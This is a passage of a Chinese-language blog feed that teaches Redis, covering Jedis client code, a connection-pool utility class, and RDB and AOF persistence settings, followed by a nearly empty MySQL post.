class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jedis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>(2)客户端连接redis</p><p>连接redis</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Jedis jedis</span> = new Jedis(<span class="hljs-string">&quot;localhost&quot;</span>, 6379);<br></code></pre></td></tr></table></figure><p>操作redis</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">jedis.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;itheima&quot;</span>);  jedis.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;name&quot;</span>);<br></code></pre></td></tr></table></figure><p>关闭redis连接</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">jedis.close()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>API文档</p><p><a href="http://xetorthio.github.io/jedis/">http://xetorthio.github.io/jedis/</a></p><h4 id="4-1-3-代码实现">4.1.3 代码实现</h4><p>创建：com.itheima.JedisTest</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JedisTest</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//1.获取连接对象</span><br>        <span class="hljs-type">Jedis</span> <span class="hljs-variable">jedis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jedis</span>(<span class="hljs-string">&quot;192.168.40.130&quot;</span>,<span class="hljs-number">6379</span>);<br>        <span class="hljs-comment">//2.执行操作</span><br>        jedis.set(<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> jedis.get(<span class="hljs-string">&quot;hello&quot;</span>);<br>        System.out.println(hello);<br>        jedis.lpush(<span class="hljs-string">&quot;list1&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>,<span class="hljs-string">&quot;d&quot;</span>);<br>        List&lt;String&gt; list1 = jedis.lrange(<span class="hljs-string">&quot;list1&quot;</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">for</span> (String s:list1 ) &#123;<br>            System.out.println(s);<br>        &#125;<br>        jedis.sadd(<span class="hljs-string">&quot;set1&quot;</span>,<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-string">&quot;def&quot;</span>,<span class="hljs-string">&quot;poi&quot;</span>,<span class="hljs-string">&quot;cba&quot;</span>);<br>        <span class="hljs-type">Long</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> jedis.scard(<span class="hljs-string">&quot;set1&quot;</span>);<br>        System.out.println(len);<br>        <span class="hljs-comment">//3.关闭连接</span><br>        jedis.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-2-Jedis简易工具类开发">4.2  Jedis简易工具类开发</h3><p>前面我们做的程序还是有点儿小问题，就是我们的Jedis对象的管理是我们自己创建的，真实企业开发中是不可能让你去new一个的，那接下来咱们就要做一个工具类，简单来说，就是做一个创建Jedis的这样的一个工具。</p><h4 id="4-2-1-基于连接池获取连接">4.2.1  基于连接池获取连接</h4><p>JedisPool：Jedis提供的连接池技术</p><p>poolConfig:连接池配置对象</p><p>host:redis服务地址</p><p>port:redis服务端口号</p><p>JedisPool的构造器如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">JedisPool</span><span class="hljs-params">(GenericObjectPoolConfig poolConfig, String host, <span class="hljs-type">int</span> port)</span> &#123;<br><span class="hljs-built_in">this</span>(poolConfig, host, port, <span class="hljs-number">2000</span>, (String)<span class="hljs-literal">null</span>, <span class="hljs-number">0</span>, (String)<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-2-2-封装连接参数">4.2.2  封装连接参数</h4><p>创建jedis的配置文件：jedis.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">jedis.host</span>=<span class="hljs-string">192.168.40.130  </span><br><span class="hljs-attr">jedis.port</span>=<span class="hljs-string">6379  </span><br><span class="hljs-attr">jedis.maxTotal</span>=<span class="hljs-string">50  </span><br><span class="hljs-attr">jedis.maxIdle</span>=<span class="hljs-string">10</span><br></code></pre></td></tr></table></figure><h4 id="4-2-3-加载配置信息">4.2.3  加载配置信息</h4><p>创建JedisUtils：com.itheima.util.JedisUtils，使用静态代码块初始化资源</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JedisUtils</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> maxTotal;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> maxIdel;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String host;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> port;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> JedisPoolConfig jpc;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> JedisPool jp;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-type">ResourceBundle</span> <span class="hljs-variable">bundle</span> <span class="hljs-operator">=</span> ResourceBundle.getBundle(<span class="hljs-string">&quot;redis&quot;</span>);<br>        maxTotal = Integer.parseInt(bundle.getString(<span class="hljs-string">&quot;redis.maxTotal&quot;</span>));<br>        maxIdel = Integer.parseInt(bundle.getString(<span class="hljs-string">&quot;redis.maxIdel&quot;</span>));<br>        host = bundle.getString(<span class="hljs-string">&quot;redis.host&quot;</span>);<br>        port = Integer.parseInt(bundle.getString(<span class="hljs-string">&quot;redis.port&quot;</span>));<br>        <span class="hljs-comment">//Jedis连接池配置</span><br>        jpc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JedisPoolConfig</span>();<br>        jpc.setMaxTotal(maxTotal);<br>        jpc.setMaxIdle(maxIdel);<br>        jp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JedisPool</span>(jpc,host,port);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-2-4-获取连接">4.2.4  获取连接</h4><p>对外访问接口，提供jedis连接对象，连接从连接池获取，在JedisUtils中添加一个获取jedis的方法：getJedis</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Jedis <span class="hljs-title function_">getJedis</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">Jedis</span> <span class="hljs-variable">jedis</span> <span class="hljs-operator">=</span> jedisPool.getResource();<br><span class="hljs-keyword">return</span> jedis;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-3-可视化客户端">4.3  可视化客户端</h3><p>4.3.1  Redis Desktop Manager</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C%E5%8F%AF%E8%A7%86%E5%8C%96.png" alt></p><h2 id="5-持久化">5. 持久化</h2><p>下面呢，进入到持久化的学习.这部分内容理解的东西多，操作的东西少。在这个部分，我们将讲解四个东西：</p><p>持久化简介</p><p>RDB</p><p>AOF</p><p>RDB与AOF区别</p><h3 id="5-1-持久化简介">5.1  持久化简介</h3><h4 id="5-1-1-场景-意外断电">5.1.1  场景-意外断电</h4><p>不知道大家有没有遇见过，就是正工作的时候停电了，如果你用的是笔记本电脑还好，你有电池，但如果你用的是台式机呢，那恐怕就比较灾难了，假如你现在正在写一个比较重要的文档，如果你要使用的是word，这种办公自动化软件的话，他一旦遇到停电，其实你不用担心，因为它会给你生成一些其他的文件。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C%E6%8C%81%E4%B9%85%E5%8C%96%E6%A1%88%E4%BE%8B1.png" alt></p><p>其实他们都在做一件事儿，帮你自动恢复，有了这个文件，你前面的东西就不再丢了。那什么是自动恢复呢？你要先了解他的整个过程。</p><p>我们说自动恢复，其实基于的一个前提就是他提前把你的数据给存起来了。你平常操作的所有信息都是在内存中的，而我们真正的信息是保存在硬盘中的，内存中的信息断电以后就消失了，硬盘中的信息断电以后还可以保留下来！</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C%E5%A4%87%E4%BB%BD.png" alt></p><p>我们将文件由内存中保存到硬盘中的这个过程，我们叫做数据保存，也就叫做持久化。但是把它保存下来不是你的目的，最终你还要把它再读取出来，它加载到内存中这个过程，我们叫做数据恢复，这就是我们所说的word为什么断电以后还能够给你保留文件，因为它执行了一个自动备份的过程，也就是通过自动的形式，把你的数据存储起来，那么有了这种形式以后，我们的数据就可以由内存到硬盘上实现保存。</p><h4 id="5-1-2-什么是持久化">5.1.2  什么是持久化</h4><p>(1)什么是持久化</p><p>利用永久性存储介质将数据进行保存，在特定的时间将保存的数据进行恢复的工作机制称为持久化 。</p><p>持久化用于防止数据的意外丢失，确保数据安全性。</p><p>(2)持久化过程保存什么？</p><p>我们知道一点，计算机中的数据全部都是二进制，如果现在我要你给我保存一组数据的话，你有什么样的方式呢，其实最简单的就是现在长什么样，我就记下来就行了，那么这种是记录纯粹的数据，也叫做快照存储，也就是它保存的是某一时刻的数据状态。</p><p>还有一种形式，它不记录你的数据，它记录你所有的操作过程，比如说大家用idea的时候，有没有遇到过写错了ctrl+z撤销，然后ctrl+y还能恢复，这个地方它也是在记录，但是记录的是你所有的操作过程，那我想问一下，操作过程，我都给你留下来了，你说数据还会丢吗？肯定不会丢，因为你所有的操作过程我都保存了。这种保存操作过程的存储，用专业术语来说可以说是日志，这是两种不同的保存数据的形式啊。</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C%E6%8C%81%E4%B9%85%E5%8C%962.png" alt></p><p>总结一下：</p><p>第一种：将当前数据状态进行保存，快照形式，存储数据结果，存储格式简单，关注点在数据。</p><p>第二种：将数据的操作过程进行保存，日志形式，存储操作过程，存储格式复杂，关注点在数据的操作过程。</p><h3 id="5-2-RDB">5.2  RDB</h3><h4 id="5-2-1-save指令">5.2.1  save指令</h4><p>手动执行一次保存操作</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">save</span><br></code></pre></td></tr></table></figure><p><strong>save指令相关配置</strong></p><p>设置本地数据库文件名，默认值为 dump.rdb，通常设置为dump-端口号.rdb</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">dbfilename filename</span><br></code></pre></td></tr></table></figure><p>设置存储.rdb文件的路径，通常设置成存储空间较大的目录中，目录名称data</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">dir</span> <span class="hljs-built_in">path</span><br></code></pre></td></tr></table></figure><p>设置存储至本地数据库时是否压缩数据，默认yes，设置为no，节省 CPU 运行时间，但存储文件变大</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rdbcompression</span> <span class="hljs-literal">yes</span>|<span class="hljs-literal">no</span><br></code></pre></td></tr></table></figure><p>设置读写文件过程是否进行RDB格式校验，默认yes，设置为no，节约读写10%时间消耗，单存在数据损坏的风险</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rdbchecksum</span> <span class="hljs-literal">yes</span>|<span class="hljs-literal">no</span><br></code></pre></td></tr></table></figure><p><strong>save指令工作原理</strong></p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5Crdb%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F.png" alt></p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/Redis%E5%9F%BA%E7%A1%80%5C%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F2.png" alt></p><p>需要注意一个问题，来看一下，现在有四个客户端各自要执行一个指令，把这些指令发送到redis服务器后，他们执行有一个先后顺序问题，假定就是按照1234的顺序放过去的话，那会是什么样的？</p><p>记得redis是个单线程的工作模式，它会创建一个任务队列，所有的命令都会进到这个队列里边，在这儿排队执行，执行完一个消失一个，当所有的命令都执行完了，OK，结果达到了。</p><p>但是如果现在我们执行的时候save指令保存的数据量很大会是什么现象呢？</p><p>他会非常耗时，以至于影响到它在执行的时候，后面的指令都要等，所以说这种模式是不友好的，这是save指令对应的一个问题，当cpu执行的时候会阻塞redis服务器，直到他执行完毕，所以说我们不建议大家在线上环境用save指令。</p><h4 id="5-2-2-bgsave指令">5.2.2  bgsave指令</h4><p>之前我们讲到了当save指令的数据量过大时，单线程执行方式造成效率过低，那应该如何处理？</p><p>此时我们可以使用：<strong>bgsave</strong>指令，bg其实是background的意思，后台执行的意思</p><p>手动启动后台保存操作，但不是立即执行</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">bgsave</span><br></code></pre></td></tr></table></figure><p><strong>bgsave指令相关配置</strong></p><p>后台存储过程中如果出现错误现象，是否停止保存操作，默认yes</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">stop-writes-on-bgsave-error</span> <span class="hljs-string">yes|no</span><br></code></pre></td></tr></table></figure><p>其 他</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">dbfilename</span> <span class="hljs-string">filename  </span><br><span class="hljs-attr">dir</span> <span class="hljs-string">path  </span><br><span class="hljs-attr">rdbcompression</span> <span class="hljs-string">yes|no  </span><br><span class="hljs-attr">rdbchecksum</span> <span class="hljs-string">yes|no</span><br></code></pre></td></tr></table></figure><p><strong>bgsave指令工作原理</strong></p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/rdb%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F3.png" alt></p><p>当执行bgsave的时候，客户端发出bgsave指令给到redis服务器。注意，这个时候服务器马上回一个结果告诉客户端后台已经开始了，与此同时它会创建一个子进程，使用Linux的fork函数创建一个子进程，让这个子进程去执行save相关的操作，此时我们可以想一下，我们主进程一直在处理指令，而子进程在执行后台的保存，它会不会干扰到主进程的执行吗？</p><p>答案是不会，所以说他才是主流方案。子进程开始执行之后，它就会创建啊RDB文件把它存起来，操作完以后他会把这个结果返回，也就是说bgsave的过程分成两个过程，第一个是服务端拿到指令直接告诉客户端开始执行了；另外一个过程是一个子进程在完成后台的保存操作，操作完以后回一个消息。</p><h4 id="5-2-3-save配置自动执行">5.2.3 save配置自动执行</h4><p>设置自动持久化的条件，满足限定时间范围内key的变化数量达到指定数量即进行持久化</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">save</span> <span class="hljs-string">second changes</span><br></code></pre></td></tr></table></figure><p>参数</p><p>second：监控时间范围</p><p>changes：监控key的变化量</p><p>范例：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">save 900 1<br>save 300 10<br>save 60 10000<br></code></pre></td></tr></table></figure><p>其他相关配置：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">dbfilename filename<br>dir path<br>rdbcompression yes|no<br>rdbchecksum yes|no<br>stop-writes-on-bgsave-error yes|no<br></code></pre></td></tr></table></figure><p><strong>save配置工作原理</strong></p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F4.png" alt></p><h4 id="5-2-4-RDB三种启动方式对比">5.2.4 RDB三种启动方式对比</h4><table><thead><tr><th>方式</th><th>save指令</th><th>bgsave指令</th></tr></thead><tbody><tr><td>读写</td><td>同步</td><td>异步</td></tr><tr><td>阻塞客户端指令</td><td>是</td><td>否</td></tr><tr><td>额外内存消耗</td><td>否</td><td>是</td></tr><tr><td>启动新进程</td><td>否</td><td>是</td></tr></tbody></table><p><strong>RDB特殊启动形式</strong></p><p>服务器运行过程中重启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">debug reload<br></code></pre></td></tr></table></figure><p>关闭服务器时指定保存数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">shutdown save<br></code></pre></td></tr></table></figure><p>全量复制（在主从复制中详细讲解）</p><p><strong>RDB优点：</strong></p><ul class="lvl-0"><li class="lvl-2"><p>RDB是一个紧凑压缩的二进制文件，存储效率较高</p></li><li class="lvl-2"><p>RDB内部存储的是redis在某个时间点的数据快照，非常适合用于数据备份，全量复制等场景</p></li><li class="lvl-2"><p>RDB恢复数据的速度要比AOF快很多</p></li><li class="lvl-2"><p>应用：服务器中每X小时执行bgsave备份，并将RDB文件拷贝到远程机器中，用于灾难恢复。</p></li></ul><p><strong>RDB缺点</strong></p><ul class="lvl-0"><li class="lvl-2"><p>RDB方式无论是执行指令还是利用配置，无法做到实时持久化，具有较大的可能性丢失数据</p></li><li class="lvl-2"><p>bgsave指令每次运行要执行fork操作创建子进程，要牺牲掉一些性能</p></li><li class="lvl-2"><p>Redis的众多版本中未进行RDB文件格式的版本统一，有可能出现各版本服务之间数据格式无法兼容现象</p></li></ul><h3 id="5-3-AOF">5.3  AOF</h3><p>为什么要有AOF,这得从RDB的存储的弊端说起：</p><ul class="lvl-0"><li class="lvl-2"><p>存储数据量较大，效率较低，基于快照思想，每次读写都是全部数据，当数据量巨大时，效率非常低</p></li><li class="lvl-2"><p>大数据量下的IO性能较低</p></li><li class="lvl-2"><p>基于fork创建子进程，内存产生额外消耗</p></li><li class="lvl-2"><p>宕机带来的数据丢失风险</p></li></ul><p>那解决的思路是什么呢？</p><ul class="lvl-0"><li class="lvl-2"><p>不写全数据，仅记录部分数据</p></li><li class="lvl-2"><p>降低区分数据是否改变的难度，改记录数据为记录操作过程</p></li><li class="lvl-2"><p>对所有操作均进行记录，排除丢失数据的风险</p></li></ul><h4 id="5-3-1-AOF概念">5.3.1 AOF概念</h4><p><strong>AOF</strong>(append only file)持久化：以独立日志的方式记录每次写命令，重启时再重新执行AOF文件中命令 达到恢复数据的目的。<strong>与RDB相比可以简单理解为由记录数据改为记录数据产生的变化</strong></p><p>AOF的主要作用是解决了数据持久化的实时性，目前已经是Redis持久化的主流方式</p><p><strong>AOF写数据过程</strong></p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/1.png" alt></p><p><strong>启动AOF相关配置</strong></p><p>开启AOF持久化功能，默认no，即不开启状态</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">appendonly</span> <span class="hljs-string">yes|no</span><br></code></pre></td></tr></table></figure><p>AOF持久化文件名，默认文件名为appendonly.aof，建议配置为appendonly-端口号.aof</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">appendfilename</span> <span class="hljs-string">filename</span><br></code></pre></td></tr></table></figure><p>AOF持久化文件保存路径，与RDB持久化文件保持一致即可</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">dir</span><br></code></pre></td></tr></table></figure><p>AOF写数据策略，默认为everysec</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">appendfsync</span> <span class="hljs-string">always|everysec|no</span><br></code></pre></td></tr></table></figure><h4 id="5-3-2-AOF执行策略">5.3.2 AOF执行策略</h4><p>AOF写数据三种策略(appendfsync)</p><ul class="lvl-0"><li class="lvl-2"><p><strong>always</strong>(每次）：每次写入操作均同步到AOF文件中数据零误差，性能较低，不建议使用。</p></li><li class="lvl-2"><p><strong>everysec</strong>（每秒）：每秒将缓冲区中的指令同步到AOF文件中，在系统突然宕机的情况下丢失1秒内的数据 数据准确性较高，性能较高，建议使用，也是默认配置</p></li><li class="lvl-2"><p><strong>no</strong>（系统控制）：由操作系统控制每次同步到AOF文件的周期，整体过程不可控</p></li></ul><h4 id="5-3-3-AOF重写">5.3.3 AOF重写</h4><p>场景：AOF写数据遇到的问题，如果连续执行如下指令该如何处理</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/2.png" alt></p><p><strong>什么叫AOF重写？</strong></p><p>随着命令不断写入AOF，文件会越来越大，为了解决这个问题，Redis引入了AOF重写机制压缩文件体积。AOF文件重 写是将Redis进程内的数据转化为写命令同步到新AOF文件的过程。简单说就是将对同一个数据的若干个条命令执行结 果转化成最终结果数据对应的指令进行记录。</p><p><strong>AOF重写作用</strong></p><ul class="lvl-0"><li class="lvl-2"><p>降低磁盘占用量，提高磁盘利用率</p></li><li class="lvl-2"><p>提高持久化效率，降低持久化写时间，提高IO性能</p></li><li class="lvl-2"><p>降低数据恢复用时，提高数据恢复效率</p></li></ul><p><strong>AOF重写规则</strong></p><ul class="lvl-0"><li class="lvl-2"><p>进程内具有时效性的数据，并且数据已超时将不再写入文件</p></li><li class="lvl-2"><p>非写入类的无效指令将被忽略，只保留最终数据的写入命令</p><p>如del key1、 hdel key2、srem key3、set key4 111、set key4 222等</p><p>如select指令虽然不更改数据，但是更改了数据的存储位置，此类命令同样需要记录</p></li><li class="lvl-2"><p>对同一数据的多条写命令合并为一条命令</p></li></ul><p>如lpushlist1 a、lpush list1 b、lpush list1 c可以转化为：lpush list1 a b c。</p><p>为防止数据量过大造成客户端缓冲区溢出，对list、set、hash、zset等类型，每条指令最多写入64个元素</p><p><strong>AOF重写方式</strong></p><ul class="lvl-0"><li class="lvl-2"><p>手动重写</p></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">bgrewriteaof</span><br></code></pre></td></tr></table></figure><p><strong>手动重写原理分析：</strong></p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/3.png" alt></p><ul class="lvl-0"><li class="lvl-2"><p>自动重写</p></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">auto-aof-rewrite-min-size</span> <span class="hljs-string">size</span><br><span class="hljs-attr">auto-aof-rewrite-percentage</span> <span class="hljs-string">percentage</span><br></code></pre></td></tr></table></figure><p>自动重写触发条件设置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">auto-aof-rewrite-min-size</span> <span class="hljs-string">size</span><br><span class="hljs-attr">auto-aof-rewrite-percentage</span> <span class="hljs-string">percent</span><br></code></pre></td></tr></table></figure><p>自动重写触发比对参数（ 运行指令info Persistence获取具体信息 ）</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">aof_current_size</span>  <span class="hljs-string"></span><br><span class="hljs-attr">aof_base_size</span><br></code></pre></td></tr></table></figure><p>自动重写触发条件公式：</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/4.png" alt></p><h4 id="5-3-4-AOF工作流程及重写流程">5.3.4 AOF工作流程及重写流程</h4><p>![](./Redis基础/AOF 工作流程.png)</p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/AOF%E6%B5%81%E7%A8%8B2.png" alt></p><p><img src="/2022/12/31/Redis%E5%9F%BA%E7%A1%80/AOF3.png" alt></p><h3 id="5-4-RDB与AOF区别">5.4  RDB与AOF区别</h3><h4 id="5-4-1-RDB与AOF对比（优缺点）">5.4.1 RDB与AOF对比（优缺点）</h4><table><thead><tr><th>持久化方式</th><th>RDB</th><th>AOF</th></tr></thead><tbody><tr><td>占用存储空间</td><td>小（数据级：压缩）</td><td>大（指令级：重写）</td></tr><tr><td>存储速度</td><td>慢</td><td>快</td></tr><tr><td>恢复速度</td><td>快</td><td>慢</td></tr><tr><td>数据安全性</td><td>会丢失数据</td><td>依据策略决定</td></tr><tr><td>资源消耗</td><td>高/重量级</td><td>低/轻量级</td></tr><tr><td>启动优先级</td><td>低</td><td>高</td></tr></tbody></table><h4 id="5-4-2-RDB与AOF应用场景">5.4.2 RDB与AOF应用场景</h4><p>RDB与AOF的选择之惑</p><ul class="lvl-0"><li class="lvl-2"><p>对数据非常敏感，建议使用默认的AOF持久化方案</p></li></ul><p>AOF持久化策略使用everysecond，每秒钟fsync一次。该策略redis仍可以保持很好的处理性能，当出 现问题时，最多丢失0-1秒内的数据。</p><p>注意：由于AOF文件存储体积较大，且恢复速度较慢</p><ul class="lvl-0"><li class="lvl-2"><p>数据呈现阶段有效性，建议使用RDB持久化方案</p></li></ul><p>数据可以良好的做到阶段内无丢失（该阶段是开发者或运维人员手工维护的），且恢复速度较快，阶段 点数据恢复通常采用RDB方案</p><p>注意：利用RDB实现紧凑的数据持久化会使Redis降的很低，慎重总结：</p><p><strong>综合比对</strong></p><ul class="lvl-0"><li class="lvl-2"><p>RDB与AOF的选择实际上是在做一种权衡，每种都有利有弊</p></li><li class="lvl-2"><p>如不能承受数分钟以内的数据丢失，对业务数据非常敏感，选用AOF</p></li><li class="lvl-2"><p>如能承受数分钟以内的数据丢失，且追求大数据集的恢复速度，选用RDB</p></li><li class="lvl-2"><p>灾难恢复选用RDB</p></li><li class="lvl-2"><p>双保险策略，同时开启 RDB和 AOF，重启后，Redis优先使用 AOF 来恢复数据，降低丢失数据的量</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
      <tag>NoSQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySQL</title>
    <link href="/2022/12/29/MySQL/"/>
    <url>/2022/12/29/MySQL/</url>
    
    <content type="html"><![CDATA[<p><img src="/2022/12/29/MySQL/MySQL%E5%9F%BA%E7%A1%80.jpg" alt="MySQL基础"></p>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
